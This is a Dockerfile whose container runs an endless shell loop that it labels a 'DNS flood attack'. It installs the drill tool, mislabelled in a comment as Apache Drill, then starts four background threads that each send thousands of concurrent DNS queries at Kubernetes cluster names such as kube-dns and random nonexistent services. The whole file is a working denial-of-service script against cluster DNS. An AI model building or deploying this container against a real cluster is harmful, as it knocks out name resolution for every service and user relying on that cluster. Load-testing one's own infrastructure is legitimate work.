# Use Alpine as the base image
FROM alpine:latest

# Install Apache Drill and other dependencies
RUN apk update && \
    apk add --no-cache \
    drill \
    bash

# Run the attack script with logging
CMD /bin/sh -c \
  "apk add --no-cache drill && \
   echo 'Starting DNS flood attack...'; \
   while true; do \
     echo 'Starting new thread group...'; \
     for thread in \$(seq 1 4); do \
       echo 'Starting thread \$thread...'; \
       ( \
         while true; do \
           echo 'Starting a new query cycle...'; \
           for i in \$(seq 1 1000); do \
             echo 'Executing drill command for fake-\$RANDOM...'; \
             drill a.b.c.d.e.f.g.h.fake-\$RANDOM.svc.cluster.local & \
             drill kubernetes.default.svc.cluster.local & \
             drill kube-dns.kube-system.svc.cluster.local & \
             drill nonexist-\$RANDOM.default.pod.cluster.local & \
           done; \
           echo 'Completed 1000 queries, waiting for background tasks to finish...'; \
           wait; \
         done; \
       ) & \
     done; \
     echo 'All threads finished, waiting for the next cycle...'; \
     wait; \
   done"
